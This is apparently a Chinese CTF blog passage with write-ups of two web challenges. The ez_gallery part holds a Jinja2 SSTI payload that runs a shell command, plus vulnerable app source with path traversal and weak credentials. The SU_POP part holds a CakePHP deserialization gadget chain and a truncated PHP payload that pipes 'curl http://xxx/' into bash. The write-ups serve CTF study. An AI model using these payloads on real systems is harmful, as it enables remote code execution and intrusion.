env</h3><ol><li><code>docker run --name ez_gallery -d -p 5000:6543 sketchpl4ne/gcb2024:ez_gallery_img</code></li></ol><h3 id="ez-galllery-分析"><a href="#ez-galllery-分析" class="headerlink" title="ez_galllery 分析"></a>ez_galllery 分析</h3><ol><li><p>标头看出是python框架</p></li><li><p>没有其他信息，弱密码admin:123456</p><ol><li><p>扫目录</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[15:47:12] 403 -    12B - /home</span><br><span class="line">[15:47:13] 403 -    12B - /info</span><br><span class="line">[15:47:14] 200 -    5KB - /login</span><br><span class="line">[15:47:18] 403 -    12B - /shell</span><br></pre></td></tr></table></figure></li><li><p>shell可访问？先读个文件</p><ol><li><code>/info?file=/proc/self/cmdline</code>: python3 app.py</li><li>置空报错进debug？似乎不行，有对错误进行处理</li><li>看app.py: <code>/info?file=../../app.py</code><ol><li>有没见过的东西: pyramid，是啥</li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jinja2</span><br><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.httpexceptions <span class="keyword">import</span> HTTPFound</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.session <span class="keyword">import</span> SignedCookieSessionFactory</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> Captcha <span class="keyword">import</span> captcha_image_view, captcha_store</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">users = &#123;<span class="string">&quot;admin&quot;</span>: User(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 重定向到 /login</span></span><br><span class="line">    <span class="keyword">return</span> HTTPFound(location=<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 查看细节内容</span></span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;请先登录&quot;</span>, status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    file_name = request.params.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="comment"># 文件名和后缀分开</span></span><br><span class="line">    file_base, file_extension = os.path.splitext(file_name)</span><br><span class="line">    <span class="keyword">if</span> file_name:</span><br><span class="line">        <span class="comment"># 有一个新目录</span></span><br><span class="line">        file_path = os.path.join(<span class="string">&#x27;/app/static/details/&#x27;</span>, file_name)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">                <span class="built_in">print</span>(content)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            content = <span class="string">&quot;文件未找到。&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = <span class="string">&quot;未提供文件名。&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;file_name&#x27;</span>: file_name, <span class="string">&#x27;content&#x27;</span>: content, <span class="string">&#x27;file_base&#x27;</span>: file_base&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 主路由</span></span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;请先登录&quot;</span>, status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    detailtxt = os.listdir(<span class="string">&#x27;/app/static/details/&#x27;</span>)  <span class="comment"># 可列目录</span></span><br><span class="line">    picture_list = [i[:i.index(<span class="string">&#x27;.&#x27;</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt]</span><br><span class="line">    file_contents = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> picture <span class="keyword">in</span> picture_list:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;/app/static/details/<span class="subst">&#123;picture&#125;</span>.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_contents[picture] = f.read(<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;picture_list&#x27;</span>: picture_list, <span class="string">&#x27;file_contents&#x27;</span>: file_contents&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.POST.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.POST.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user_captcha = request.POST.get(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;&#x27;</span>).upper()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> user_captcha != captcha_store.get(<span class="string">&#x27;captcha_text&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;验证码错误，请重试。&quot;</span>)</span><br><span class="line">        user = users.get(username)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user.password == password:</span><br><span class="line">            request.session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;登录成功！&amp;amp;lt;a href=&#x27;/home&#x27;&amp;amp;gt;点击进入主页&amp;amp;lt;/a&amp;amp;gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;用户名或密码错误。&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell_view</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;请先登录&quot;</span>, status=<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打ssti</span></span><br><span class="line">    expression = request.GET.get(<span class="string">&#x27;shellcmd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 过滤length, count, ., 数字, %</span></span><br><span class="line">    blacklist_patterns = [<span class="string">r&#x27;.*length.*&#x27;</span>,<span class="string">r&#x27;.*count.*&#x27;</span>,<span class="string">r&#x27;.*[0-9].*&#x27;</span>,<span class="string">r&#x27;.*\..*&#x27;</span>,<span class="string">r&#x27;.*soft.*&#x27;</span>,<span class="string">r&#x27;.*%.*&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(re.search(pattern, expression) <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklist_patterns):</span><br><span class="line">        <span class="comment"># 也没有报错阿老弟</span></span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&#x27;wafwafwaf&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render(&#123;<span class="string">&quot;request&quot;</span>: request&#125;)</span><br><span class="line">        <span class="keyword">if</span> result != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session_factory = SignedCookieSessionFactory(<span class="string">&#x27;secret_key&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> Configurator(session_factory=session_factory) <span class="keyword">as</span> config:</span><br><span class="line">        config.include(<span class="string">&#x27;pyramid_chameleon&#x27;</span>)  <span class="comment"># 添加渲染模板</span></span><br><span class="line">        config.add_static_view(name=<span class="string">&#x27;static&#x27;</span>, path=<span class="string">&#x27;/app/static&#x27;</span>)</span><br><span class="line">        config.set_default_permission(<span class="string">&#x27;view&#x27;</span>)  <span class="comment"># 设置默认权限为view</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 注册路由</span></span><br><span class="line">        config.add_route(<span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;captcha&#x27;</span>, <span class="string">&#x27;/captcha&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;/info&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;login&#x27;</span>, <span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        config.add_route(<span class="string">&#x27;shell&#x27;</span>, <span class="string">&#x27;/shell&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 注册视图</span></span><br><span class="line">        config.add_view(root_view, route_name=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">        config.add_view(captcha_image_view, route_name=<span class="string">&#x27;captcha&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home&#x27;</span>, renderer=<span class="string">&#x27;/app/templates/home.pt&#x27;</span>, permission=<span class="string">&#x27;view&#x27;</span>)</span><br><span class="line">        config.add_view(info_view, route_name=<span class="string">&#x27;info&#x27;</span>, renderer=<span class="string">&#x27;/app/templates/details.pt&#x27;</span>, permission=<span class="string">&#x27;view&#x27;</span>)</span><br><span class="line">        config.add_view(login_view, route_name=<span class="string">&#x27;login&#x27;</span>, renderer=<span class="string">&#x27;/app/templates/login.pt&#x27;</span>)</span><br><span class="line">        config.add_view(shell_view, route_name=<span class="string">&#x27;shell&#x27;</span>, renderer=<span class="string">&#x27;string&#x27;</span>, permission=<span class="string">&#x27;view&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        config.scan()</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line">        <span class="keyword">return</span> app</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = main()</span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">6543</span>, app)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></li></ol></li><li><p>思路其实很多的</p><ol><li>钩子回显: 官方题解: flag{jasper_wanna_two_girlfriend}: <code>&quot;shellcmd&quot;: &quot;&#123;&#123;cycler['__init__']['__globals__']['__builtins__']['exec'](\"getattr(request,'add_response_callback')(lambda request,response:setattr(response, 'text', getattr(getattr(__import__('os'),'popen')('/readflag'),'read')()))\",&#123;'request': request&#125;)&#125;&#125;&quot;</code></li><li>带外(ban了.和数字难绕过)</li><li>写入文件回显: -rwxr-xr-x 1 root root 4659 Dec 13 21:54 &#x2F;app&#x2F;app.py app.py没有权限</li><li>盲注来获取信息: bash时间盲注: [<a href="https://xz.aliyun.com/news/16077]%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%99%E9%87%8C%E6%9C%89%E4%B8%AA%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98%EF%BC%8C%E6%97%B6%E9%97%B4%E4%B8%8A%E6%9C%89%E7%82%B9%E9%9A%BE%E5%B4%A9">https://xz.aliyun.com/news/16077]，不过这里有个登录问题，时间上有点难崩</a></li></ol></li></ol><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol><li>Mountain<ul><li><input disabled="" type="checkbox"> 识别不同框架特征</li><li><input disabled="" type="checkbox"> 反序列化数据格式辨别(base64)</li></ul><ol><li>多多观察，返回包，session等等，攻击点泛化</li></ol></li><li>signal<ul><li><input disabled="" type="checkbox"> 备份文件，文件泄露补充</li><li><input disabled="" type="checkbox"> filter-chain，rce和读文件再熟悉一下</li><li><input disabled="" type="checkbox"> 二次编码原理</li><li><input disabled="" type="checkbox"> ssrf全面一些</li></ul><ol><li>还是不能太依赖dirsearch 555</li></ol></li><li>图片查看器<ul><li><input disabled="" type="checkbox"> filter-chain，rce和读文件再熟悉一下</li><li><input disabled="" type="checkbox"> phar反序列化的细节和绕过</li><li><input disabled="" type="checkbox"> php:&#x2F;&#x2F;filter</li><li><input disabled="" type="checkbox"> 合理推测后台检测方式和函数</li></ul></li><li>n0ob_un4er<ol><li>不愧是少解题目</li></ol><ul><li><input checked="" disabled="" type="checkbox"> 输入源可以从临时文件，从具体的php版本下session的存储入手(不要依靠刻板印象): 不开启session会在上传文件的时候生成session临时文件，搜索: php session file<ol><li>其实是session.upload_progress这个东西的缘故<a href="https://cloud.tencent.com/developer/article/2035863">source</a></li></ol></li><li><input disabled="" type="checkbox"> php session机制的认识</li></ul></li><li>ez_gallery<ul><li><input disabled="" type="checkbox"> 弱密码积累一下</li><li><input disabled="" type="checkbox"> pipx+fenjing</li></ul></li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>[<a href="https://eddiemurphy89.github.io/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/]">https://eddiemurphy89.github.io/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/]</a></li><li>[<a href="https://z3r4y.blog.csdn.net/article/details/144701835]">https://z3r4y.blog.csdn.net/article/details/144701835]</a></li><li><a href="https://jaspersec.top/2024/12/16/0x12%20%E5%9B%BD%E5%9F%8E%E6%9D%AF2024%20writeup%20with%20docker/">一些docker和题解</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2025</title>
      <link href="/2025/01/21/SUCTF2025/"/>
      <url>/2025/01/21/SUCTF2025/</url>
      
        <content type="html"><![CDATA[<blockquote><p>java题目等年后再来嘻嘻</p></blockquote><h2 id="SU-POP"><a href="#SU-POP" class="headerlink" title="SU_POP"></a>SU_POP</h2><h3 id="SU-POP-环境配置"><a href="#SU-POP-环境配置" class="headerlink" title="SU_POP 环境配置"></a>SU_POP 环境配置</h3><ol><li>不用使用compose</li><li>Dockerfile build一下: <code>docker build -t su_pop:latest .</code></li><li>run一下即可: <code>docker run -d -p 5000:80 --name su_pop su_pop:latest</code></li><li>可以访问就ok了</li></ol><h3 id="SU-POP-分析-SV"><a href="#SU-POP-分析-SV" class="headerlink" title="SU_POP 分析 | SV"></a>SU_POP 分析 | SV</h3><ol><li>这里链子的寻找和java的反序列化链子很像</li><li>有源码文件，审计一波吧<ol><li>&#x2F;var&#x2F;www&#x2F;html 可读可写；有mysql连接</li><li>信息都会交给pagesController进行处理</li><li>锁定范围pop链子，比赛时到这里找不到链子的入口点就断了，节省时间直接看题解提示和思路找链子吧(<strong>实际上并没有进行锁定，直接找bro</strong>)</li></ol></li></ol><h3 id="SU-POP-复现-SV"><a href="#SU-POP-复现-SV" class="headerlink" title="SU_POP 复现 | SV"></a>SU_POP 复现 | SV</h3><ol><li><p>由于没有做出来，直接看怎么复现，分析一下目录结构</p><ol><li>app_local.php: 有security的salt值，数据库名与密码，EmailTransport</li><li>route.php: 路由</li><li>PagesController.php<ol start="4"><li>在handleSer()函数中传入函数即可成功反序列化，并且会显示回来(html转移了似乎<code>h()</code>)</li><li>display应该可以不用管，这里就是单纯返回渲染后的文件</li></ol></li></ol></li><li><p>调用链子(<strong>实际上是一个很耗费时间的过程，但是大致就那么几步，简单-&gt;复杂找就好</strong>)</p><ol><li><strong>S1: 找文章熟悉一下和寻找及技巧(这一步也可以在后面)</strong>: <a href="https://xz.aliyun.com/t/9995?time__1311=n4+xnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-8">其实这篇有看到过55</a></li><li><strong>S2: 找sink</strong>: 就是代码执行或者命令执行，或者是回调(任意函数调用)的地方<ol><li>这里不浪费时间，直接搜eval，最简单的有两个<ol><li>Mockclass::generate() mockName, classCode均可控</li><li>Mocktrait::generate() mockName, classCode均可控</li></ol></li></ol></li><li><strong>S3: 找调用处</strong>，可以是回调&#x2F;名称调用，直接搜call(，有<ol><li>TraceableCommand::__call(…)</li><li>ReflectionContainer::call(…)</li><li>BehaviorRegistry::call(…) 这个比较easy的逻辑，设置变量比较easy</li><li>Association.php::__call(…)</li><li>TranslateBehavior.php::__call(…)</li><li>Table.php::__call(…)</li><li>后面还有很多，先复现吧</li></ol></li><li>再找调用usages看看，也可以是__call<ol><li>Table.php::__call(…) 可以调用BehaviorRegistry::call()</li></ol></li><li><strong>S4: 魔术方法再往上比较难，按照技巧&#x2F;换一个方向寻找(或者找文章)</strong><ol><li>目的是要到__call，不知道调用的是什么方法，但是可以知道是Table这个对象的(找了半个小时突然发现<strong>php是动态类型的</strong>，笑)，这里只需要是Table对象调用不同方法，这个Table对象可以是随便赋值的(因为是php)</li><li>有一个方法是从给定的魔术方法入手，__toString()就很好，但是这里不是，这里是<strong>换了个方向</strong></li></ol></li><li><strong>S5: 找__destruct()&#x2F;__wakeup()</strong><ol><li>__wakeup()没有找到</li><li>RejectedPromise的__destruct()下一步有__toString()，可控，ok了家人们，找__toString()到可控对象调用函数</li></ol></li><li><strong>S6: 顺着可控的__destruct()</strong><ol><li>Response.php:__toString()可控，只需要把stream变成Table即可</li></ol></li></ol><blockquote><p>还是vscode用的爽</p></blockquote> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">React\Promise\Internal\RejectedPromise</span>::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">--&gt;<span class="title class_">Cake\Http\Response</span>::<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">--&gt;Cake\ORM<span class="title class_">\Table</span>::<span class="title function_ invoke__">__call</span>()</span><br><span class="line">--&gt;Cake\ORM<span class="title class_">\BehaviorRegistry</span>::<span class="title function_ invoke__">call</span>()</span><br><span class="line">--&gt;<span class="title class_">PHPUnit\Framework\MockObject\Generator\MockClass</span>::<span class="title function_ invoke__">generate</span>()</span><br></pre></td></tr></table></figure></li><li><p>来个payload即可</p><ol><li><p>本地docker起一个cakephp服务</p><ol><li><p>Dockerfile和docker-compose.yml如下（ai的嘻嘻）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dockerfile</span></span><br><span class="line">FROM php:<span class="number">8.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装必要的 PHP 扩展</span></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    libicu-dev libonig-dev libzip-dev unzip git \</span><br><span class="line">    &amp;&amp; docker-php-ext-install intl mbstring pdo pdo_mysql opcache \</span><br><span class="line">    &amp;&amp; a2enmod rewrite</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Composer</span></span><br><span class="line">RUN curl -L https:<span class="comment">//getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line">WORKDIR /<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 CakePHP 5 项目</span></span><br><span class="line">RUN composer create-project --prefer-dist <span class="string">&quot;cakephp/app:^5.0&quot;</span> . \</span><br><span class="line">    &amp;&amp; chown -R www-data:www-data /<span class="keyword">var</span>/www/html \</span><br><span class="line">    &amp;&amp; chmod -R <span class="number">755</span> /<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露 Web 服务端口</span></span><br><span class="line">EXPOSE <span class="number">80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// docker-compose.yml</span></span><br><span class="line"><span class="comment">// 需要创建一个/logsl来存放logs，也可以添加更多来进行持久化</span></span><br><span class="line">services:</span><br><span class="line">    web:</span><br><span class="line">        build: .</span><br><span class="line">        ports:</span><br><span class="line">            - <span class="string">&quot;4999:80&quot;</span></span><br><span class="line">        volumes:</span><br><span class="line">            - /home/kc1zs4/Docker/SUctf25/cakephp5/logs:/<span class="keyword">var</span>/log/apache2</span><br><span class="line">        restart: always</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;webroot 下直接起一个服务可以直接使用php文件</p></li></ol>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// su_pop.php</span></span><br><span class="line"><span class="comment">// 只需要设置需要利用到的属性即可，这里需要搞懂一下命名空间</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPUnit</span>\<span class="title class_">Framework</span>\<span class="title class_">MockObject</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$classCode</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mockName</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;classCode =<span class="string">&quot;system(&#x27;curl http://xxx/ | bash&#x27;);&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mockName = <span class="string">&quot;KC1zs4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Generator</span>\<span class="title">MockClass</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BehaviorRegistry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_methodMap</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_loaded</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_methodMap = [<span class="string">&quot;rewind&quot;</span> =&gt; [<span class="string">&quot;KC1zs4&quot;</span>, <span 